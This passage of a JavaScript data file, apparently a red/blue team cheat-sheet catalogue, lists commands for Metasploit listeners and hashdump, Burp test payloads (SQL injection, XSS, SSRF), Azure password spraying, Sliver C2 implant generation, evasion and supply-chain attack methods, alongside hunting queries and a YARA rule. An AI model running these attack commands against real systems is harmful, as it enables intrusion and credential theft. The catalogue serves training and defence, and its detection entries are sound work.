      },
      killchain: 'weaponization', attack: ['execution'], pyramid: 'tools', owasp: ['A03'] },
    { id: 'msf-handler', title: 'Multi/Handler Listener', team: 'red', category: 'metasploit',
      description: 'Catch callbacks and manage sessions.',
      tags: ['metasploit', 'handler', 'meterpreter', 'listener'],
      command: '# MULTI/HANDLER\nmsf6> use exploit/multi/handler\nmsf6> set PAYLOAD windows/x64/meterpreter/reverse_tcp\nmsf6> set LHOST 0.0.0.0\nmsf6> set LPORT 4444\nmsf6> set ExitOnSession false\nmsf6> exploit -j\n\n# Session commands\nmeterpreter > sysinfo\nmeterpreter > getuid\nmeterpreter > hashdump\nmeterpreter > load kiwi\nmeterpreter > shell\nmeterpreter > background',
      killchain: 'exploitation', attack: ['execution', 'command-control'], pyramid: 'tools', owasp: ['A06'] },
    { id: 'msf-scanning', title: 'Auxiliary Scanners', team: 'red', category: 'metasploit',
      description: 'Scanning and enumeration modules.',
      tags: ['metasploit', 'auxiliary', 'scanner', 'enumeration'],
      command: '# SCANNERS\nmsf6> use auxiliary/scanner/portscan/tcp\nmsf6> use auxiliary/scanner/smb/smb_version\nmsf6> use auxiliary/scanner/smb/smb_enumshares\nmsf6> use auxiliary/scanner/ssh/ssh_version\nmsf6> use auxiliary/scanner/http/dir_scanner\nmsf6> use auxiliary/scanner/ftp/anonymous\nmsf6> use auxiliary/scanner/smb/smb_ms17_010',
      killchain: 'recon', attack: ['discovery'], pyramid: 'tools', owasp: ['A05'] },
    { id: 'msf-post', title: 'Post-Exploitation Modules', team: 'red', category: 'metasploit',
      description: 'Post modules for credentials, pivoting, persistence.',
      tags: ['metasploit', 'post-exploit', 'meterpreter', 'persistence'],
      command: '# POST-EXPLOITATION\nmeterpreter > run post/windows/gather/hashdump\nmeterpreter > run post/multi/gather/ssh_creds\nmeterpreter > run post/windows/gather/enum_applications\nmeterpreter > run autoroute -s 10.10.10.0/24\nmeterpreter > portfwd add -l 3389 -p 3389 -r TARGET\nmsf6> use post/multi/recon/local_exploit_suggester',
      killchain: 'actions', attack: ['credential-access', 'lateral-movement'], pyramid: 'tools', owasp: ['A04'] },

    // ── Burp Suite ──
    { id: 'burp-proxy', title: 'Burp Proxy Setup', team: 'red', category: 'burp',
      description: 'Configure proxy, CA cert, scope, shortcuts.',
      tags: ['burpsuite', 'proxy', 'intercept', 'http'],
      command: '# BURP PROXY\n# Default: 127.0.0.1:8080\n# CA: http://burpsuite > download cert\n# Scope: Target > Scope > Add target\n# Shortcuts: Ctrl+I=Intruder Ctrl+R=Repeater Ctrl+F=Forward Ctrl+T=Toggle',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'tools', owasp: ['A05'] },
    { id: 'burp-intruder', title: 'Burp Intruder Attacks', team: 'red', category: 'burp',
      description: 'Intruder attack types and payload config.',
      tags: ['burpsuite', 'intruder', 'fuzzing', 'bruteforce'],
      command: '# INTRUDER TYPES\n# SNIPER: one position at a time\n# BATTERING RAM: all positions same\n# PITCHFORK: parallel sets\n# CLUSTER BOMB: all combinations\n# Payloads: list, file, numbers, brute forcer, null',
      killchain: 'exploitation', attack: ['credential-access'], pyramid: 'tools', owasp: ['A07'] },
    { id: 'burp-repeater', title: 'Repeater & Scanner', team: 'red', category: 'burp',
      description: 'Manual request manipulation and injection testing.',
      tags: ['burpsuite', 'repeater', 'scanner', 'injection'],
      command: '# REPEATER: Ctrl+R from Proxy\n# SQLi: id=1\'  UNION SELECT null\n# XSS: <img src=x onerror=alert(1)>\n# SSRF: url=http://169.254.169.254/\n# Scanner (Pro): Passive or Active\n# Tools: Comparer, Decoder, Sequencer',
      killchain: 'exploitation', attack: ['initial-access'], pyramid: 'tools', owasp: ['A03'] },
    { id: 'burp-extensions', title: 'Essential Extensions', team: 'red', category: 'burp',
      description: 'Key extensions: Autorize, JWT Editor, Param Miner.',
      tags: ['burpsuite', 'extensions', 'autorize', 'jwt', 'param-miner'],
      command: '# EXTENSIONS (BApp Store)\n# Autorize: auth testing (Red=Bypass Green=OK)\n# JWT Editor: alg confusion, none, key inject\n# Param Miner: hidden params, cache poison\n# Logger++, Active Scan++, Turbo Intruder\n# Hackvertor, InQL (GraphQL), Upload Scanner',
      killchain: 'exploitation', attack: ['privilege-escalation'], pyramid: 'tools', owasp: ['A01'] },

    // ── Azure ──
    { id: 'azure-recon', title: 'Azure Recon', team: 'red', category: 'azure',
      description: 'Enumerate Azure tenants, subdomains, storage.',
      tags: ['azure', 'entra-id', 'cloud', 'reconnaissance'],
      command: '# AZURE RECON\ncurl -s "https://login.microsoftonline.com/T.onmicrosoft.com/.well-known/openid-configuration" | jq .\n# Subdomains: blob/azurewebsites/database/vault\n# Blobs: curl TARGET.blob.core.windows.net/C?restype=container&comp=list\n# Certs: crt.sh\n# Secrets: trufflehog, gitleaks',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'artifacts', owasp: ['A05'] },
    { id: 'azure-auth-attack', title: 'Azure Auth Attacks', team: 'red', category: 'azure',
      description: 'Password spray, MFA bypass, OAuth device code.',
      tags: ['azure', 'entra-id', 'password-spray', 'oauth'],
      command: '# AUTH ATTACKS\n# MSOLSpray: Invoke-MSOLSpray -UserList users.txt -Password "P@ss"\n# ROADtools: roadtx auth / roadtx describe\n# Device code: roadtx codeauth (victim: microsoft.com/devicelogin)\n# AADInternals: Get-AADIntLoginInformation / TenantDetails',
      killchain: 'exploitation', attack: ['credential-access'], pyramid: 'credentials', owasp: ['A07'] },
    { id: 'azure-post-exploit', title: 'Azure Post-Exploitation', team: 'red', category: 'azure',
      description: 'AzureHound, ROADtools, PowerZure, Key Vault.',
      tags: ['azure', 'azurehound', 'roadtools', 'privesc'],
      command: '# POST-EXPLOITATION\n# AzureHound: attack path analysis\n# ROADtools: roadrecon gather / gui\n# PowerZure: Get-AzureTargets / RoleAssignment\n# VM exec: az vm run-command invoke\n# Persist: az ad app create + credential reset\n# Key Vault: az keyvault list / secret show',
      killchain: 'actions', attack: ['privilege-escalation', 'persistence'], pyramid: 'tools', owasp: ['A01'] },
    { id: 'azure-defense', title: 'Azure Defense', team: 'blue', category: 'azure',
      description: 'Sentinel KQL, Conditional Access, Monkey365.',
      tags: ['azure', 'sentinel', 'defense', 'monitoring'],
      command: '# AZURE DEFENSE\n# Sentinel KQL: SigninLogs | where ResultType=="50126" | summarize by IP\n# OAuth: AuditLogs | where OperationName=="Consent to application"\n# Conditional Access: MFA, block legacy, compliant devices\n# Monkey365: Invoke-Monkey365 -ExportTo HTML -Analysis All',
      killchain: 'defense', attack: ['credential-access'], pyramid: 'ttps', owasp: ['A01'] },

    // ── Windows Events ──
    { id: 'winevents-security', title: 'Security Event IDs', team: 'blue', category: 'winevents',
      description: 'Critical Security log event IDs.',
      tags: ['windows-events', 'security-log', 'event-ids'],
      command: '# SECURITY EVENT IDs\n# Logon: 4624(ok) 4625(fail) 4648(explicit) 4672(admin)\n# Account: 4720(create) 4724(pw-reset) 4726(delete) 4740(lock)\n# Groups: 4728/4732/4756 (member added)\n# Process: 4688(create) 4697(service) 4698(task) 4719(policy)\n# Object: 4656(handle) 4663(access) 5140/5145(share)',
      killchain: 'defense', attack: ['credential-access', 'persistence'], pyramid: 'artifacts', owasp: ['A09'] },
    { id: 'winevents-sysmon', title: 'Sysmon Event IDs', team: 'blue', category: 'winevents',
      description: 'Sysmon events for endpoint monitoring.',
      tags: ['sysmon', 'windows-events', 'endpoint-detection'],
      command: '# SYSMON IDs\n# Process: 1=Create 5=Exit 6=Driver 7=DLL\n# Network: 3=Conn 22=DNS\n# File: 11=Create 15=ADS 23/26=Delete\n# Registry: 12=Add 13=Set 14=Rename\n# WMI: 19/20/21\n# Inject: 8=RemoteThread 10=Access 17/18=Pipe 25=Tamper\n# Install: sysmon64 -i config.xml',
      killchain: 'defense', attack: ['execution', 'persistence'], pyramid: 'artifacts', owasp: ['A09'] },
    { id: 'winevents-splunk', title: 'Splunk SPL Queries', team: 'blue', category: 'winevents',
      description: 'Splunk queries for Windows event detection.',
      tags: ['splunk', 'spl', 'siem', 'windows-events'],
      command: '# SPLUNK SPL\n# Brute: index=wineventlog EventCode=4625 | stats count by src_ip\n# Users: EventCode=4720 | table TargetUserName\n# Services: EventCode=7045 | search *cmd* OR *powershell*\n# PS: EventCode=4104 | search *Net.WebClient* OR *IEX*\n# Office shells: index=sysmon EventCode=1 ParentImage=*winword*',
      killchain: 'defense', attack: ['credential-access', 'execution'], pyramid: 'artifacts', owasp: ['A09'] },
    { id: 'winevents-powershell', title: 'PowerShell Logging', team: 'blue', category: 'winevents',
      description: 'Enable Script Block, Module, Transcription logging.',
      tags: ['powershell', 'logging', 'detection', 'scriptblock'],
      command: '# PS LOGGING\n# Script Block (4104): ScriptBlockLogging=1\n# Module (4103): ModuleLogging=1 ModuleNames=*\n# Transcription: EnableTranscripting=1\n# Registry: HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\...\n# Watch: IEX, Net.WebClient, -enc, DownloadString',
      killchain: 'defense', attack: ['execution'], pyramid: 'artifacts', owasp: ['A09'] },
    { id: 'winevents-hunting', title: 'Threat Hunting', team: 'blue', category: 'winevents',
      description: 'Hunt for LOLBins, credential access, persistence.',
      tags: ['threat-hunting', 'windows-events', 'lolbins'],
      command: '# THREAT HUNTING\n# LOLBins: certutil, mshta, regsvr32, rundll32, wmic, bitsadmin\n# Cred dump: Sysmon 10 to lsass\n# Tasks: Security 4698 + Sysmon 1\n# WMI: Sysmon 19/20/21\n# Lateral: 4624 Type3, named pipes, admin shares\n# Kerberoast: 4769 + RC4 (0x17)',
      killchain: 'defense', attack: ['persistence', 'lateral-movement'], pyramid: 'artifacts', owasp: ['A09'] },

    // ── OPSEC ──
    { id: 'opsec-infra', title: 'Infrastructure OPSEC', team: 'red', category: 'opsec',
      description: 'Redirectors, domain management, traffic blending.',
      tags: ['opsec', 'infrastructure', 'redirector'],
      command: '# INFRA OPSEC\n# Redirector: socat TCP4-LISTEN:443,fork TCP4:C2:443\n# Domains: aged > 6mo, clean reputation\n# Certs: LetsEncrypt, match CN/SAN\n# Traffic: legit UA, TLS 1.3, jitter 30-50%\n# Rotate IPs every 24-48h',
      killchain: 'c2', attack: ['command-control'], pyramid: 'artifacts', owasp: ['A05'] },
    { id: 'opsec-operator', title: 'Operator OPSEC', team: 'red', category: 'opsec',
      description: 'Personal OPSEC checklist.',
      tags: ['opsec', 'operator', 'attribution', 'vm'],
      command: '# OPERATOR OPSEC\n# VM snapshot, no personal accts, VPN\n# MAC randomize, generic hostname\n# Separate email/profiles for infra\n# Encrypted comms, codenames\n# Compile tools from source\n# exiftool -all= report.pdf\n# Post: remove implants, destroy VM',
      killchain: 'recon', attack: ['defense-evasion'], pyramid: 'ttps', owasp: ['A05'] },
    { id: 'opsec-detection-evasion', title: 'Detection Evasion', team: 'red', category: 'opsec',
      description: 'Evading EDR/SIEM during authorized engagements.',
      tags: ['opsec', 'evasion', 'edr', 'siem'],
      command: '# EVASION (AUTHORIZED)\n# Timing: biz hours, slow scans\n# Network: HTTPS C2, separate IPs\n# Endpoint: sleep+jitter, LOLBins, memory-only\n# Creds: Kerberos over NTLM\n# C2 profiles: match legit traffic',
      killchain: 'c2', attack: ['defense-evasion'], pyramid: 'tools', owasp: ['A05'] },
    { id: 'opsec-blue', title: 'OPSEC Detection', team: 'blue', category: 'opsec',
      description: 'Detect red team OPSEC failures.',
      tags: ['opsec', 'detection', 'c2-detection', 'blue-team'],
      command: '# DETECT OPSEC FAILURES\n# New domains, VPS providers, JA3 mismatch\n# Default tool signatures, Sigma rules\n# Regular beacon intervals\n# Long HTTPS, DNS TXT floods\n# Honeytokens: canary accounts, fake creds, canarytokens.org',
      killchain: 'defense', attack: ['command-control'], pyramid: 'tools', owasp: ['A09'] },

    // ── Round 13: Gap categories ─────────────────────────────────

    // ── Sliver C2 (expanding c2 category) ──
    { id: 'sliver-basics', title: 'Sliver C2 Basics', team: 'red', category: 'c2',
      description: 'Sliver C2 framework: server setup, listener types (mTLS, HTTP, DNS, WireGuard), implant generation.',
      tags: ['sliver', 'c2', 'implant', 'mtls'],
      command: '# SLIVER C2 BASICS\n\n# Install server\ncurl https://sliver.sh/install | sudo bash\n\n# Start server\nsliver-server\n\n# Listeners\nsliver > mtls --lhost 0.0.0.0 --lport 8888\nsliver > https --lhost 0.0.0.0 --lport 443\nsliver > dns --domains c2.example.com\nsliver > wg --lport 53\n\n# Generate implant (session = interactive)\nsliver > generate --mtls C2_IP:8888 --os windows --arch amd64 -s /tmp/implant.exe\n\n# Generate beacon (periodic check-in)\nsliver > generate beacon --mtls C2_IP:8888 --seconds 30 --jitter 50 --os windows\n\n# List implants & sessions\nsliver > implants\nsliver > sessions\nsliver > use SESSION_ID\n\n# Operator multiplayer\nsliver > new-operator --name op1 --lhost C2_IP\n# Import config on operator machine',
      killchain: 'c2', attack: ['command-control'], pyramid: 'tools', owasp: ['A05'] },
    { id: 'sliver-post', title: 'Sliver Post-Exploitation', team: 'red', category: 'c2',
      description: 'Sliver post-exploitation: execute commands, upload/download, pivoting, process injection.',
      tags: ['sliver', 'c2', 'post-exploit', 'pivot'],
      command: '# SLIVER POST-EXPLOITATION\n\n# Basic commands\nsliver (SESSION) > info\nsliver (SESSION) > whoami\nsliver (SESSION) > getuid\nsliver (SESSION) > ps        # Process list\nsliver (SESSION) > ls\nsliver (SESSION) > cd C:\\Users\n\n# Execute\nsliver (SESSION) > execute -o cmd.exe /c ipconfig\nsliver (SESSION) > shell     # Interactive shell\n\n# File transfer\nsliver (SESSION) > upload /local/tool.exe C:\\temp\\tool.exe\nsliver (SESSION) > download C:\\secrets.txt /local/loot/\n\n# Proxy/Pivot\nsliver (SESSION) > socks5 start\n# Use proxychains with port 1081\n\n# Process injection\nsliver (SESSION) > migrate PID\n\n# Screenshots\nsliver (SESSION) > screenshot',
      killchain: 'actions', attack: ['execution', 'command-control', 'lateral-movement'], pyramid: 'tools', owasp: ['A05'] },

    // ── Supply Chain Security ──
    { id: 'supply-chain-scan', title: 'Dependency Scanning', team: 'blue', category: 'supplychain',
      description: 'Scan dependencies for known vulnerabilities using SCA tools: npm audit, pip-audit, Trivy, Snyk.',
      tags: ['supply-chain', 'dependency', 'sca', 'vulnerability'],
      commands: {
        linux: '# DEPENDENCY SCANNING (Linux/macOS)\n\n# Node.js\nnpm audit\nnpm audit --json | jq .vulnerabilities\nnpm audit fix\n\n# Python\npip-audit\npip-audit --fix\npip install safety && safety check\n\n# Go\ngo list -json -m all | nancy sleuth\ngovulncheck ./...\n\n# Rust\ncargo audit\ncargo deny check\n\n# Container images\ntrivy image myapp:latest\ntrivy fs --security-checks vuln,secret .\n\n# Multi-language (Snyk)\nsnyk test\nsnyk monitor  # continuous monitoring\n\n# SBOM generation\nsynft packages dir:. -o spdx-json > sbom.json\ntrivy image --format spdx-json myapp:latest > sbom.json',
        windows: '# DEPENDENCY SCANNING (Windows)\n\n# .NET\ndotnet list package --vulnerable\ndotnet list package --deprecated\n\n# Node.js\nnpm audit\nnpm audit fix\n\n# Snyk (cross-platform)\nsnyk test\nsnyk container test myapp:latest'
      },
      killchain: 'defense', attack: ['initial-access', 'initial-access'], pyramid: 'tools', owasp: ['A06'] },
    { id: 'supply-chain-attack', title: 'Supply Chain Attack Vectors', team: 'red', category: 'supplychain',
      description: 'Common supply chain attack vectors: typosquatting, dependency confusion, CI/CD compromise, m_alicious packages.',
      tags: ['supply-chain', 'typosquatting', 'dependency-confusion', 'ci-cd'],
      command: '# SUPPLY CHAIN ATTACK VECTORS\n\n# TYPOSQUATTING\n# Register packages with similar names:\n# lodash -> lodahs, loadash\n# requests -> reqeusts\n# Detection: check download stats, age, maintainer\n\n# DEPENDENCY CONFUSION\n# Exploit private package resolution:\n# 1. Find internal package names (job postings, GitHub, error msgs)\n# 2. Register same name on public registry with higher version\n# 3. Build system pulls public version\n# Defense: scoped registries, .npmrc, pip --index-url\n\n# CI/CD POISONING\n# Compromise build pipeline:\n# - Inject into Dockerfile / build scripts\n# - Modify GitHub Actions / GitLab CI\n# - Tamper with artifact registries\n# Defense: signed commits, SLSA framework, reproducible builds\n\n# MALICIOUS PACKAGES\n# Red flags:\n# - postinstall scripts with network calls\n# - Obfuscated code in install hooks\n# - New maintainer on popular package\n# Tools: socket.dev, npm provenance, Sigstore',
      killchain: 'delivery', attack: ['initial-access'], pyramid: 'tools', owasp: ['A06'] },
    { id: 'supply-chain-defense', title: 'Supply Chain Hardening', team: 'blue', category: 'supplychain',
      description: 'Defend against supply chain attacks: lockfiles, SBOM, signing, SLSA compliance.',
      tags: ['supply-chain', 'sbom', 'slsa', 'signing', 'lockfile'],
      command: '# SUPPLY CHAIN HARDENING\n\n# LOCKFILES (pin exact versions)\n# npm: package-lock.json (npm ci in CI)\n# pip: pip freeze > requirements.txt\n# go: go.sum\n# cargo: Cargo.lock\n\n# SBOM (Software Bill of Materials)\n# Generate: syft, trivy, cyclonedx-cli\n# Standard: SPDX, CycloneDX\n# Scan: grype sbom.json\n\n# SIGNING & VERIFICATION\n# npm: npm publish --provenance\n# Sigstore/cosign: cosign sign image:tag\n# Git: git commit -S (GPG signed)\n\n# SLSA LEVELS\n# L1: Build process documented\n# L2: Hosted build, signed provenance\n# L3: Hardened builds, non-falsifiable provenance\n# L4: Two-party review, hermetic builds\n\n# POLICIES\n# Dependabot / Renovate for auto-updates\n# Socket.dev for install-time detection\n# Allowlist approved packages\n# Private registries for internal packages\n# Review all new dependencies before merge',
      killchain: 'defense', attack: ['initial-access'], pyramid: 'ttps', owasp: ['A06'] },

    // ── DevSecOps ──
    { id: 'devsecops-sast', title: 'SAST (Static Analysis)', team: 'blue', category: 'devsecops',
      description: 'Static Application Security Testing: analyze source code for vulnerabilities without execution.',
      tags: ['sast', 'static-analysis', 'code-review', 'devsecops'],
      command: '# SAST TOOLS\n\n# Multi-language\nsemgrep scan --config auto .\nsemgrep scan --config p/owasp-top-ten .\n\n# Python\nbandit -r src/\npylint --load-plugins pylint_security src/\n\n# JavaScript/TypeScript\nnpm install -g eslint-plugin-security\n# .eslintrc: plugins: ["security"]\n\n# Go\ngosec ./...\nstaticcheck ./...\n\n# Java\n# SpotBugs + FindSecBugs plugin\n# SonarQube (self-hosted or cloud)\n\n# .NET\n# Security Code Scan (NuGet)\n# dotnet analyzers\n\n# CI Integration\n# GitHub: semgrep/semgrep-action\n# GitLab: SAST template (Auto DevOps)\n# Pre-commit hook: semgrep --config auto',
      killchain: 'defense', attack: ['initial-access'], pyramid: 'tools', owasp: ['A06'] },
    { id: 'devsecops-dast', title: 'DAST (Dynamic Analysis)', team: 'blue', category: 'devsecops',
      description: 'Dynamic Application Security Testing: test running applications for vulnerabilities.',
      tags: ['dast', 'dynamic-analysis', 'web-scanning', 'devsecops'],
      command: '# DAST TOOLS\n\n# OWASP ZAP (free)\n# Passive scan: proxy traffic\n# Active scan: automated attack\n# API scan: OpenAPI/Swagger import\nzap-cli quick-scan https://target.local\nzap-cli active-scan https://target.local\n\n# Nuclei (template-based)\nnuclei -u https://target.local -t cves/\nnuclei -u https://target.local -t exposures/\nnuclei -l urls.txt -t http/technologies/\n\n# CI Integration\n# ZAP baseline scan (Docker):\n# docker run owasp/zap2docker-stable zap-baseline.py -t URL\n# ZAP full scan:\n# docker run owasp/zap2docker-stable zap-full-scan.py -t URL\n\n# IAST (Interactive - combines SAST+DAST)\n# Contrast Security, Seeker, Hdiv\n# Instruments app at runtime\n# Lower false positives than SAST/DAST alone',
      killchain: 'defense', attack: ['initial-access'], pyramid: 'tools', owasp: ['A06'] },
    { id: 'devsecops-pipeline', title: 'Security Pipeline', team: 'blue', category: 'devsecops',
      description: 'Integrate security into CI/CD: pre-commit hooks, SAST, SCA, DAST, container scanning, secrets detection.',
      tags: ['devsecops', 'cicd', 'pipeline', 'shift-left'],
      command: '# DEVSECOPS PIPELINE\n\n# STAGE 1: Pre-commit\n# - pre-commit hooks (semgrep, gitleaks)\n# - IDE plugins (Snyk, SonarLint)\n\n# STAGE 2: Build / PR\n# - SAST: semgrep, CodeQL, SonarQube\n# - SCA: npm audit, pip-audit, Snyk\n# - Secrets: gitleaks, trufflehog\n# - License: license-checker, FOSSA\n\n# STAGE 3: Container Build\n# - Image scan: trivy, Snyk Container\n# - Base image policy: only approved images\n# - Dockerfile lint: hadolint\n\n# STAGE 4: Deploy\n# - IaC scan: checkov, tfsec, kics\n# - K8s: kubesec, kube-bench\n# - Secrets in config: detect-secrets\n\n# STAGE 5: Runtime\n# - DAST: ZAP, Nuclei\n# - RASP: runtime protection\n# - WAF: ModSecurity, Cloudflare\n\n# STAGE 6: Monitor\n# - CVE monitoring: Dependabot, Renovate\n# - SIEM: log aggregation\n# - Bug bounty: HackerOne, Bugcrowd',
      killchain: 'defense', attack: ['initial-access', 'execution'], pyramid: 'ttps', owasp: ['A06'] },

    // ── Fuzzing ──
    { id: 'fuzz-web', title: 'Web Fuzzing', team: 'red', category: 'fuzzing',
      description: 'Web application fuzzing: parameter discovery, directory brute-force, API endpoint fuzzing.',
      tags: ['fuzzing', 'web', 'ffuf', 'wfuzz', 'parameter'],
      command: '# WEB FUZZING\n\n# Directory/file discovery\nffuf -u https://TARGET/FUZZ -w /usr/share/wordlists/dirb/common.txt\nffuf -u https://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt\n\n# Extension fuzzing\nffuf -u https://TARGET/indexFUZZ -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt\n\n# Parameter discovery\nffuf -u https://TARGET/api?FUZZ=test -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt\n\n# POST data fuzzing\nffuf -u https://TARGET/login -X POST -d "user=admin&pass=FUZZ" -w passwords.txt\n\n# Virtual host discovery\nffuf -u https://TARGET -H "Host: FUZZ.target.com" -w subdomains.txt -fs SIZE\n\n# Filter responses\nffuf -u https://TARGET/FUZZ -w wordlist.txt -fc 404,403  # Filter status codes\nffuf -u https://TARGET/FUZZ -w wordlist.txt -fs 1234     # Filter by size\nffuf -u https://TARGET/FUZZ -w wordlist.txt -fw 42       # Filter by word count\n\n# Rate limiting\nffuf -u https://TARGET/FUZZ -w wordlist.txt -rate 100    # 100 req/sec\nffuf -u https://TARGET/FUZZ -w wordlist.txt -t 5         # 5 threads',
      killchain: 'exploitation', attack: ['discovery', 'initial-access'], pyramid: 'tools', owasp: ['A05'] },
    { id: 'fuzz-binary', title: 'Binary Fuzzing', team: 'red', category: 'fuzzing',
      description: 'Binary/protocol fuzzing with AFL++, libFuzzer for finding crashes and memory corruption.',
      tags: ['fuzzing', 'afl', 'binary', 'crash', 'coverage'],
      command: '# BINARY FUZZING\n\n# AFL++ (coverage-guided)\n# Compile with instrumentation\nafl-gcc -o target_afl target.c\n# or: afl-clang-fast -o target_afl target.c\n\n# Create seed corpus\nmkdir seeds && echo "test" > seeds/seed1\n\n# Run fuzzer\nafl-fuzz -i seeds -o findings ./target_afl @@\n# @@ = input file placeholder\n\n# Parallel fuzzing\nafl-fuzz -i seeds -o findings -M main -- ./target_afl @@\nafl-fuzz -i seeds -o findings -S worker1 -- ./target_afl @@\n\n# libFuzzer (LLVM)\n# Write harness:\n# extern "C" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size)\nclang -fsanitize=fuzzer,address target_fuzz.c -o fuzzer\n./fuzzer corpus/\n\n# Triage crashes\nafl-tmin -i crash_file -o minimized -- ./target_afl @@\n\n# Protocol fuzzing\n# Boofuzz (Python): network protocol fuzzer\npip install boofuzz',
      killchain: 'exploitation', attack: ['execution'], pyramid: 'tools', owasp: ['A06'] },
    { id: 'fuzz-api', title: 'API Fuzzing', team: 'red', category: 'fuzzing',
      description: 'REST/GraphQL API fuzzing for parameter manipulation, auth bypass, and injection.',
      tags: ['fuzzing', 'api', 'rest', 'graphql', 'openapi'],
      command: '# API FUZZING\n\n# OpenAPI/Swagger-based\n# Schemathesis: auto-generates test cases from spec\nschemathesis run https://TARGET/openapi.json\nschemathesis run https://TARGET/openapi.json --checks all\n\n# RESTler (Microsoft)\n# Stateful REST API fuzzer\nrestler compile --api_spec openapi.json\nrestler fuzz-lean --grammar_file grammar.py\n\n# GraphQL\n# InQL (Burp extension) for introspection\n# Clairvoyance: blind introspection\nclairvoyance -o schema.json https://TARGET/graphql\n# GraphQL injection:\n# query { __schema { types { name fields { name } } } }\n\n# Custom with ffuf\nffuf -u https://TARGET/api/users/FUZZ -w ids.txt -mc 200\nffuf -u https://TARGET/api/FUZZ -w endpoints.txt -H "Authorization: Bearer TOKEN"\n\n# Rate limit testing\nfor i in $(seq 1 100); do curl -s -o /dev/null -w "%{http_code}" https://TARGET/api/login; done',
      killchain: 'exploitation', attack: ['initial-access', 'discovery'], pyramid: 'tools', owasp: ['A05'] },

    // ── Threat Hunting ──
    { id: 'hunt-methodology', title: 'Threat Hunting Methodology', team: 'blue', category: 'threathunt',
      description: 'Structured threat hunting: hypothesis-driven, intel-driven, and baseline approaches.',
      tags: ['threat-hunting', 'methodology', 'hypothesis', 'baseline'],
      command: '# THREAT HUNTING METHODOLOGY\n\n# HYPOTHESIS-DRIVEN\n# 1. Form hypothesis: "Attackers may use PowerShell to download payloads"\n# 2. Identify data sources: Sysmon, PowerShell logs\n# 3. Build query: Event 4104 + Net.WebClient\n# 4. Analyze results: baseline vs anomalies\n# 5. Document findings: true positive or refine\n\n# INTEL-DRIVEN\n# 1. Ingest IOCs from threat reports\n# 2. Search for indicators in logs/telemetry\n# 3. Pivot on findings (related IPs, domains, hashes)\n# 4. Assess scope of compromise\n\n# BASELINE\n# 1. Establish normal behavior\n# 2. Look for deviations:\n#    - Unusual process parents\n#    - New scheduled tasks\n#    - Rare network connections\n#    - First-seen binaries\n\n# FRAMEWORKS\n# MITRE ATT&CK Navigator: map coverage\n# PEAK: Prepare, Execute, Act, Knowledge\n# Sqrrl Hunting Loop: hypothesis > tools > patterns > analytics\n\n# METRICS\n# Hunts per quarter\n# Dwell time reduction\n# New detections created from hunts\n# Coverage % of ATT&CK matrix',
      killchain: 'defense', attack: ['discovery', 'execution'], pyramid: 'ttps', owasp: ['A09'] },
    { id: 'hunt-network', title: 'Network Threat Hunting', team: 'blue', category: 'threathunt',
      description: 'Hunt for network anomalies: beaconing, DNS tunneling, lateral movement, data exfiltration.',
      tags: ['threat-hunting', 'network', 'beaconing', 'dns', 'lateral'],
      command: '# NETWORK THREAT HUNTING\n\n# BEACONING DETECTION\n# Look for regular intervals in connections\n# Standard deviation of connection times\n# Jitter analysis (even jitter = C2)\n\n# DNS HUNTING\n# Long domain names (> 50 chars)\n# High entropy subdomains\n# TXT record queries to single domain\n# DNS over HTTPS to non-standard resolvers\n\n# LATERAL MOVEMENT\n# SMB to multiple hosts from one source\n# RDP from non-admin workstations\n# WinRM/PSRemoting between workstations\n# Admin share access (C$, ADMIN$)\n\n# DATA EXFILTRATION\n# Large outbound transfers (> baseline)\n# Uploads to cloud storage (Dropbox, OneDrive)\n# Encrypted connections to unknown IPs\n# DNS exfil: high volume TXT/NULL queries\n\n# ZEEK (network analysis)\nzeek -r capture.pcap\n# Analyze: conn.log, dns.log, http.log, ssl.log, files.log\n# RITA (Real Intelligence Threat Analytics)\nrita import --delete zeek_logs/ dataset1\nrita show-beacons dataset1',
      killchain: 'defense', attack: ['command-control', 'exfiltration', 'lateral-movement'], pyramid: 'artifacts', owasp: ['A09'] },

    // ── Round 14: Malware Defense, Incident Playbooks, API Security, Zero Trust ──

    // --- Malware Defense (blue) ---
    { id: 'maldef-sandbox', title: 'Malware Sandbox Analysis', team: 'blue', category: 'maldef',
      description: 'Analyze suspicious files in isolated sandbox environments to observe malware behavior.',
      tags: ['malware', 'sandbox', 'cuckoo', 'any.run', 'joe-sandbox'],
      command: '# SANDBOX ANALYSIS\n\n# Cuckoo Sandbox (local)\ncuckoo submit /path/to/sample.exe\ncuckoo submit --timeout 300 --options procmemdump=yes /path/to/sample\n\n# Behavioral indicators to check:\n# - File system changes (created/modified/deleted)\n# - Registry modifications\n# - Network connections (C2 callbacks)\n# - Process tree (child processes spawned)\n# - API calls (CreateRemoteThread, VirtualAlloc, WriteProcessMemory)\n\n# Joe Sandbox (cloud)\n# Upload via web interface or API\ncurl -F sample=@m_alware.exe https://jbxcloud.joesecurity.org/api/v2/analysis/submit\n\n# ANY.RUN (interactive)\n# Browser-based interactive sandbox\n# Watch real-time execution and interact with sample',
      killchain: 'actions', attack: ['defense-evasion'], pyramid: 'ttps', owasp: [] },

    { id: 'maldef-yara-rules', title: 'YARA Rule Development', team: 'blue', category: 'maldef',
      description: 'Write and deploy YARA rules to detect malware families based on patterns and signatures.',
      tags: ['yara', 'detection', 'signatures', 'malware-analysis'],
      command: '# YARA RULE DEVELOPMENT\n\n# Basic rule structure\nrule Detect_Malware_Family {\n  meta:\n    author = "analyst"\n    description = "Detects MalwareX"\n    date = "2025-01-01"\n  strings:\n    $s1 = "m_alicious_string" ascii\n    $s2 = { 4D 5A 90 00 }  // MZ header + pattern\n    $s3 = /https?:\\/\\/[a-z0-9]+\\.evil\\.com/\n  condition:\n    uint16(0) == 0x5A4D and ($s1 or $s2) and $s3\n}\n\n# Scan with YARA\nyara -r rules/ /path/to/scan/\nyara -s -m rules/malware.yar suspicious_file.exe\n\n# Generate rules from samples\nyarGen -m /path/to/malware/samples/ -o generated_rules.yar\n\n# Test rules against goodware to reduce FPs\nyara -r rules/ /path/to/known-good/',
      killchain: 'defense', attack: ['resource-development'], pyramid: 'hashes', owasp: [] },

    { id: 'maldef-detonation', title: 'Safe Detonation & Triage', team: 'blue', category: 'maldef',
      description: 'Safely detonate and triage suspicious files: hashing, string extraction, PE analysis, and VirusTotal.',
